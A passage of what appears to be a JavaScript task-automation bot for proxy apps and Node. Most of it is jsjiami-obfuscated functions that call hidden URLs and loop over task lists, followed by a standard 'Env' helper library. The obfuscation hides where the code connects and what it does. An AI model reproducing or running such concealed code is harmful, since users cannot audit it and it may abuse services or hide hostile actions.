_0x49e42c[_0x56f8('83','I]Ql')](_0x56c13f);}};$[_0x56f8('84','NqHJ')](_0x55f6ee,(_0x46585d,_0x27903d,_0x30cdd9)=>{try{if(_0x46585d){console[_0x56f8('85','wc^y')]($[_0x56f8('86','q@s6')]+_0x56f8('87','dkNH'));}else{if(_0x440342[_0x56f8('88','#*go')](_0x440342[_0x56f8('89','hpAG')],_0x440342[_0x56f8('8a','H1Yr')])){console[_0x56f8('8b','(Rs#')]($[_0x56f8('8c','xR*f')]+_0x56f8('8d','Sh0P'));}else{if(_0x440342[_0x56f8('8e','nsr^')](safeGet,_0x30cdd9)){_0x30cdd9=JSON[_0x56f8('8f','nsr^')](_0x30cdd9);}}}}catch(_0x43703f){$[_0x56f8('90','$42E')](_0x43703f);}finally{if(_0x440342[_0x56f8('91','HtRB')](_0x440342[_0x56f8('92','RLb!')],_0x440342[_0x56f8('93','xS]R')])){_0x440342[_0x56f8('94','P@sc')](_0x51a0ae);}else{if(_0x440342[_0x56f8('95','RLb!')](safeGet,_0x30cdd9)){_0x30cdd9=JSON[_0x56f8('96','I]Ql')](_0x30cdd9);}}}});});}function shuye72(){var _0x630fb={'YWOfA':function(_0x2b42a5,_0x1e68bb){return _0x2b42a5===_0x1e68bb;},'YcAoq':_0x56f8('97','JNGo'),'YFsbF':function(_0x49a7c4,_0x1d5f22){return _0x49a7c4!==_0x1d5f22;},'cYipn':_0x56f8('98','I]Ql'),'lwBHs':_0x56f8('99','H1Yr'),'prLTG':_0x56f8('9a','wDdm'),'ICWNF':function(_0xd8b839){return _0xd8b839();},'BmJxX':function(_0x583f67,_0x3c60fe){return _0x583f67<_0x3c60fe;},'uTudL':function(_0x1ee268,_0x10e6cc){return _0x1ee268(_0x10e6cc);},'ABCsV':function(_0x55824f){return _0x55824f();},'KxsiJ':_0x56f8('9b','wH@^'),'Mgpas':_0x56f8('9c','EJRh'),'CuBIZ':_0x56f8('9d','nsr^')};return new Promise(_0xc7720=>{var _0x766c={'wgFrM':function(_0x2ae9c1){return _0x630fb[_0x56f8('9e','nsr^')](_0x2ae9c1);}};if(_0x630fb[_0x56f8('9f','SLFh')](_0x630fb[_0x56f8('a0','Q5^U')],_0x630fb[_0x56f8('a1','#*go')])){$[_0x56f8('a2','^F49')](e);}else{$[_0x56f8('a3','6KQA')]({'url':_0x630fb[_0x56f8('a4','koYf')],'headers':{'User-Agent':_0x630fb[_0x56f8('a5','pq01')]}},async(_0x3a35de,_0x228d42,_0x36f537)=>{try{if(_0x630fb[_0x56f8('a6','EapP')](_0x630fb[_0x56f8('a7','P@sc')],_0x630fb[_0x56f8('a8','wc^y')])){if(_0x3a35de){if(_0x630fb[_0x56f8('a9','$42E')](_0x630fb[_0x56f8('aa','6KQA')],_0x630fb[_0x56f8('ab','RIAX')])){_0x766c[_0x56f8('ac','gZ7u')](_0xc7720);}else{console[_0x56f8('ad','P@Lf')]($[_0x56f8('ae',']aVD')]+_0x56f8('af','VA)W'));}}else{if(_0x630fb[_0x56f8('b0','xR*f')](_0x630fb[_0x56f8('b1','wH@^')],_0x630fb[_0x56f8('b2','wDdm')])){console[_0x56f8('ad','P@Lf')]($[_0x56f8('4d','Sh0P')]+_0x56f8('b3','^F49'));}else{$[_0x56f8('b4','BQ[q')]=JSON[_0x56f8('b5','%u%r')](_0x36f537);await _0x630fb[_0x56f8('b6','VA)W')](shuye73);if(_0x630fb[_0x56f8('b7','VA)W')]($[_0x56f8('b8','RLb!')][_0x56f8('b9','#*go')][_0x56f8('ba','JNGo')],0x0)){for(let _0x24adb5=0x0;_0x630fb[_0x56f8('bb','Hik0')](_0x24adb5,$[_0x56f8('bc','gZ7u')][_0x56f8('bd','0pIa')][_0x56f8('be','dkNH')]);_0x24adb5++){let _0x5bf0a4=$[_0x56f8('bf','IANI')][_0x56f8('c0','rY1d')][_0x24adb5];await $[_0x56f8('c1','xS]R')](0x1f4);await _0x630fb[_0x56f8('c2','wDdm')](wuzhi,_0x5bf0a4);}await _0x630fb[_0x56f8('c3','H1Yr')](shuye74);}}}}else{_0x36f537=JSON[_0x56f8('c4','NqHJ')](_0x36f537);}}catch(_0x30c2e1){$[_0x56f8('c5','RIAX')](_0x30c2e1);}finally{_0x630fb[_0x56f8('c6','Q5^U')](_0xc7720);}});}});}function shuye73(){var _0x523225={'urzvn':function(_0x365bc2,_0x95f158){return _0x365bc2===_0x95f158;},'WJkIW':_0x56f8('c7','6[2B'),'fgUhL':_0x56f8('c8','0pIa'),'NRLAe':function(_0x1d595f){return _0x1d595f();},'dZAjd':function(_0x476182,_0x3592e8){return _0x476182===_0x3592e8;},'Ywhep':_0x56f8('c9','hpAG'),'ChKuL':_0x56f8('ca','P@sc'),'SKrzt':_0x56f8('cb','nsr^'),'WkoMx':_0x56f8('cc','HtRB')};return new Promise(_0x5ab033=>{var _0x3fa11a={'HjxPI':function(_0xab8340,_0x13c613){return _0x523225[_0x56f8('cd','P@Lf')](_0xab8340,_0x13c613);},'NacmF':_0x523225[_0x56f8('ce','hpAG')],'rWmcJ':_0x523225[_0x56f8('cf','0pIa')],'rvPbA':function(_0x18e592){return _0x523225[_0x56f8('d0','wDdm')](_0x18e592);}};if(_0x523225[_0x56f8('d1','q@s6')](_0x523225[_0x56f8('d2','%u%r')],_0x523225[_0x56f8('d3','rY1d')])){console[_0x56f8('ad','P@Lf')]($[_0x56f8('d4','#*go')]+_0x56f8('d5','Q5^U'));}else{$[_0x56f8('d6','230m')]({'url':_0x523225[_0x56f8('d7','IANI')],'headers':{'User-Agent':_0x523225[_0x56f8('d8','VA)W')]}},async(_0x4d31ef,_0x54ce23,_0x5368dd)=>{try{if(_0x4d31ef){if(_0x3fa11a[_0x56f8('d9','(Rs#')](_0x3fa11a[_0x56f8('da','nsvy')],_0x3fa11a[_0x56f8('db','(Rs#')])){if(_0x4d31ef){console[_0x56f8('dc','wH@^')]($[_0x56f8('dd','$42E')]+_0x56f8('de','BQ[q'));}else{_0x5368dd=JSON[_0x56f8('df','^F49')](_0x5368dd);}}else{console[_0x56f8('e0','$42E')]($[_0x56f8('86','q@s6')]+_0x56f8('e1','xR*f'));}}else{$[_0x56f8('e2','5qH6')]=JSON[_0x56f8('e3','2krs')](_0x5368dd);$[_0x56f8('e4','nsr^')]=$[_0x56f8('e5','KlDs')][_0x56f8('e6','Q5^U')];}}catch(_0x594f0b){$[_0x56f8('e7','SLFh')](_0x594f0b);}finally{_0x3fa11a[_0x56f8('e8','(Rs#')](_0x5ab033);}});}});}function shuye74(){var _0x552625={'busdY':function(_0x226da4){return _0x226da4();},'SjiBv':function(_0x4d6c42,_0x26e92f){return _0x4d6c42!==_0x26e92f;},'FvXlI':_0x56f8('e9','xR*f'),'zgTjw':function(_0x2841df,_0x36f677){return _0x2841df===_0x36f677;},'TCPzt':_0x56f8('ea','(fhh'),'jvzsa':_0x56f8('eb','%u%r'),'ECOOB':function(_0x5c17e9,_0x1b7c85){return _0x5c17e9(_0x1b7c85);},'MAhmQ':_0x56f8('ec','SLFh'),'BOSaf':_0x56f8('ed','VA)W'),'YYQul':function(_0x1ecc98,_0x5653c5){return _0x1ecc98<_0x5653c5;},'aJxcq':function(_0xbc225b,_0x4b5cd1){return _0xbc225b===_0x4b5cd1;},'rrwmo':_0x56f8('ee','SLFh'),'nzvnj':_0x56f8('ef','wH@^'),'WjAkv':_0x56f8('f0','wH@^')};return new Promise(_0x54d9bf=>{var _0x51333b={'zAGjM':function(_0x4699fc){return _0x552625[_0x56f8('f1','xR*f')](_0x4699fc);},'xqFEe':function(_0x268b14,_0x367d5b){return _0x552625[_0x56f8('f2','I]Ql')](_0x268b14,_0x367d5b);},'hdTmk':_0x552625[_0x56f8('f3','NqHJ')],'vCVgk':function(_0x39fe1f,_0x51d4ff){return _0x552625[_0x56f8('f4','P@Lf')](_0x39fe1f,_0x51d4ff);},'gtXed':_0x552625[_0x56f8('f5','pq01')],'LOFeL':_0x552625[_0x56f8('f6','%u%r')],'zuGVb':function(_0x5ac0f6,_0x470966){return _0x552625[_0x56f8('f7','0pIa')](_0x5ac0f6,_0x470966);},'BueHj':function(_0x215347,_0xdd0d37){return _0x552625[_0x56f8('f8','wc^y')](_0x215347,_0xdd0d37);},'IVPWp':_0x552625[_0x56f8('f9','KlDs')],'jTSgL':_0x552625[_0x56f8('fa','5qH6')],'zynwo':function(_0x5e8934,_0xc5e107){return _0x552625[_0x56f8('fb','5qH6')](_0x5e8934,_0xc5e107);},'zjYTy':function(_0x3f9ea5,_0x5e2e1e){return _0x552625[_0x56f8('fc','dkNH')](_0x3f9ea5,_0x5e2e1e);},'Cejbp':_0x552625[_0x56f8('fd','pq01')],'CZdFl':function(_0x21eca1){return _0x552625[_0x56f8('fe','koYf')](_0x21eca1);}};$[_0x56f8('a3','6KQA')]({'url':_0x552625[_0x56f8('ff','5qH6')],'headers':{'User-Agent':_0x552625[_0x56f8('100','230m')]}},async(_0x4623d4,_0x5482ee,_0x16e4ed)=>{try{if(_0x51333b[_0x56f8('101','wH@^')](_0x51333b[_0x56f8('102','P@sc')],_0x51333b[_0x56f8('103','(Rs#')])){$[_0x56f8('104','IANI')](e);}else{if(_0x4623d4){console[_0x56f8('105','BQ[q')]($[_0x56f8('106','wc^y')]+_0x56f8('107','wc^y'));}else{if(_0x51333b[_0x56f8('108','gZ7u')](_0x51333b[_0x56f8('109',']aVD')],_0x51333b[_0x56f8('10a','rY1d')])){$[_0x56f8('10b','wH@^')](e);}else{if(_0x51333b[_0x56f8('10c','xS]R')](safeGet,_0x16e4ed)){if(_0x51333b[_0x56f8('10d','NqHJ')](_0x51333b[_0x56f8('10e','NqHJ')],_0x51333b[_0x56f8('10f','HtRB')])){_0x51333b[_0x56f8('110','hpAG')](_0x54d9bf);}else{$[_0x56f8('111','2krs')]=JSON[_0x56f8('b5','%u%r')](_0x16e4ed);if(_0x51333b[_0x56f8('112','Hik0')]($[_0x56f8('113','(fhh')][_0x56f8('114',']aVD')],0x0)){for(let _0x6e250c=0x0;_0x51333b[_0x56f8('115','gZ7u')](_0x6e250c,$[_0x56f8('111','2krs')][_0x56f8('116','BQ[q')][_0x56f8('117','2krs')]);_0x6e250c++){if(_0x51333b[_0x56f8('118','#*go')](_0x51333b[_0x56f8('119','wc^y')],_0x51333b[_0x56f8('11a','5qH6')])){let _0x30fbc5=$[_0x56f8('11b','wauy')][_0x56f8('11c','H1Yr')][_0x6e250c];await $[_0x56f8('11d','^F49')](0x1f4);await _0x51333b[_0x56f8('11e','gZ7u')](wuzhi01,_0x30fbc5);}else{$[_0x56f8('48','q@s6')](e);}}}}}}}}}catch(_0x4c64e7){$[_0x56f8('11f','(Rs#')](_0x4c64e7);}finally{_0x51333b[_0x56f8('120','wH@^')](_0x54d9bf);}});});};_0xodc='jsjiami.com.v6';
// prettier-ignore
function Env(t,e){class s{constructor(t){this.env=t}send(t,e="GET"){t="string"==typeof t?{url:t}:t;let s=this.get;return"POST"===e&&(s=this.post),new Promise((e,i)=>{s.call(this,t,(t,s,r)=>{t?i(t):e(s)})})}get(t){return this.send.call(this.env,t)}post(t){return this.send.call(this.env,t,"POST")}}return new class{constructor(t,e){this.name=t,this.http=new s(this),this.data=null,this.dataFile="box.dat",this.logs=[],this.isMute=!1,this.isNeedRewrite=!1,this.logSeparator="\n",this.startTime=(new Date).getTime(),Object.assign(this,e),this.log("",`🔔${this.name}, 开始!`)}isNode(){return"undefined"!=typeof module&&!!module.exports}isQuanX(){return"undefined"!=typeof $task}isSurge(){return"undefined"!=typeof $httpClient&&"undefined"==typeof $loon}isLoon(){return"undefined"!=typeof $loon}toObj(t,e=null){try{return JSON.parse(t)}catch{return e}}toStr(t,e=null){try{return JSON.stringify(t)}catch{return e}}getjson(t,e){let s=e;const i=this.getdata(t);if(i)try{s=JSON.parse(this.getdata(t))}catch{}return s}setjson(t,e){try{return this.setdata(JSON.stringify(t),e)}catch{return!1}}getScript(t){return new Promise(e=>{this.get({url:t},(t,s,i)=>e(i))})}runScript(t,e){return new Promise(s=>{let i=this.getdata("@chavy_boxjs_userCfgs.httpapi");i=i?i.replace(/\n/g,"").trim():i;let r=this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");r=r?1*r:20,r=e&&e.timeout?e.timeout:r;const[o,h]=i.split("@"),n={url:`http://${h}/v1/scripting/evaluate`,body:{script_text:t,mock_type:"cron",timeout:r},headers:{"X-Key":o,Accept:"*/*"}};this.post(n,(t,e,i)=>s(i))}).catch(t=>this.logErr(t))}loaddata(){if(!this.isNode())return{};{this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e);if(!s&&!i)return{};{const i=s?t:e;try{return JSON.parse(this.fs.readFileSync(i))}catch(t){return{}}}}}writedata(){if(this.isNode()){this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e),r=JSON.stringify(this.data);s?this.fs.writeFileSync(t,r):i?this.fs.writeFileSync(e,r):this.fs.writeFileSync(t,r)}}lodash_get(t,e,s){const i=e.replace(/\[(\d+)\]/g,".$1").split(".");let r=t;for(const t of i)if(r=Object(r)[t],void 0===r)return s;return r}lodash_set(t,e,s){return Object(t)!==t?t:(Array.isArray(e)||(e=e.toString().match(/[^.[\]]+/g)||[]),e.slice(0,-1).reduce((t,s,i)=>Object(t[s])===t[s]?t[s]:t[s]=Math.abs(e[i+1])>>0==+e[i+1]?[]:{},t)[e[e.length-1]]=s,t)}getdata(t){let e=this.getval(t);if(/^@/.test(t)){const[,s,i]=/^@(.*?)\.(.*?)$/.exec(t),r=s?this.getval(s):"";if(r)try{const t=JSON.parse(r);e=t?this.lodash_get(t,i,""):e}catch(t){e=""}}return e}setdata(t,e){let s=!1;if(/^@/.test(e)){const[,i,r]=/^@(.*?)\.(.*?)$/.exec(e),o=this.getval(i),h=i?"null"===o?null:o||"{}":"{}";try{const e=JSON.parse(h);this.lodash_set(e,r,t),s=this.setval(JSON.stringify(e),i)}catch(e){const o={};this.lodash_set(o,r,t),s=this.setval(JSON.stringify(o),i)}}else s=this.setval(t,e);return s}getval(t){return this.isSurge()||this.isLoon()?$persistentStore.read(t):this.isQuanX()?$prefs.valueForKey(t):this.isNode()?(this.data=this.loaddata(),this.data[t]):this.data&&this.data[t]||null}setval(t,e){return this.isSurge()||this.isLoon()?$persistentStore.write(t,e):this.isQuanX()?$prefs.setValueForKey(t,e):this.isNode()?(this.data=this.loaddata(),this.data[e]=t,this.writedata(),!0):this.data&&this.data[e]||null}initGotEnv(t){this.got=this.got?this.got:require("got"),this.cktough=this.cktough?this.cktough:require("tough-cookie"),this.ckjar=this.ckjar?this.ckjar:new this.cktough.CookieJar,t&&(t.headers=t.headers?t.headers:{},void 0===t.headers.Cookie&&void 0===t.cookieJar&&(t.cookieJar=this.ckjar))}get(t,e=(()=>{})){t.headers&&(delete t.headers["Content-Type"],delete t.headers["Content-Length"]),this.isSurge()||this.isLoon()?(this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.get(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)})):this.isQuanX()?(this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t))):this.isNode()&&(this.initGotEnv(t),this.got(t).on("redirect",(t,e)=>{try{if(t.headers["set-cookie"]){const s=t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();s&&this.ckjar.setCookieSync(s,null),e.cookieJar=this.ckjar}}catch(t){this.logErr(t)}}).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)}))}post(t,e=(()=>{})){if(t.body&&t.headers&&!t.headers["Content-Type"]&&(t.headers["Content-Type"]="application/x-www-form-urlencoded"),t.headers&&delete t.headers["Content-Length"],this.isSurge()||this.isLoon())this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.post(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)});else if(this.isQuanX())t.method="POST",this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t));else if(this.isNode()){this.initGotEnv(t);const{url:s,...i}=t;this.got.post(s,i).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)})}}time(t,e=null){const s=e?new Date(e):new Date;let i={"M+":s.getMonth()+1,"d+":s.getDate(),"H+":s.getHours(),"m+":s.getMinutes(),"s+":s.getSeconds(),"q+":Math.floor((s.getMonth()+3)/3),S:s.getMilliseconds()};/(y+)/.test(t)&&(t=t.replace(RegExp.$1,(s.getFullYear()+"").substr(4-RegExp.$1.length)));for(let e in i)new RegExp("("+e+")").test(t)&&(t=t.replace(RegExp.$1,1==RegExp.$1.length?i[e]:("00"+i[e]).substr((""+i[e]).length)));return t}msg(e=t,s="",i="",r){const o=t=>{if(!t)return t;if("string"==typeof t)return this.isLoon()?t:this.isQuanX()?{"open-url":t}:this.isSurge()?{url:t}:void 0;if("object"==typeof t){if(this.isLoon()){let e=t.openUrl||t.url||t["open-url"],s=t.mediaUrl||t["media-url"];return{openUrl:e,mediaUrl:s}}if(this.isQuanX()){let e=t["open-url"]||t.url||t.openUrl,s=t["media-url"]||t.mediaUrl;return{"open-url":e,"media-url":s}}if(this.isSurge()){let e=t.url||t.openUrl||t["open-url"];return{url:e}}}};if(this.isMute||(this.isSurge()||this.isLoon()?$notification.post(e,s,i,o(r)):this.isQuanX()&&$notify(e,s,i,o(r))),!this.isMuteLog){let t=["","==============📣系统通知📣=============="];t.push(e),s&&t.push(s),i&&t.push(i),console.log(t.join("\n")),this.logs=this.logs.concat(t)}}log(...t){t.length>0&&(this.logs=[...this.logs,...t]),console.log(t.join(this.logSeparator))}logErr(t,e){const s=!this.isSurge()&&!this.isQuanX()&&!this.isLoon();s?this.log("",`❗️${this.name}, 错误!`,t.stack):this.log("",`❗️${this.name}, 错误!`,t)}wait(t){return new Promise(e=>setTimeout(e,t))}done(t={}){const e=(new Date).getTime(),s=(e-this.startTime)/1e3;this.log("",`🔔${this.name}, 结束! 🕛 ${s} 秒`),this.log(),(this.isSurge()||this.isQuanX()||this.isLoon())&&$done(t)}}(t,e)}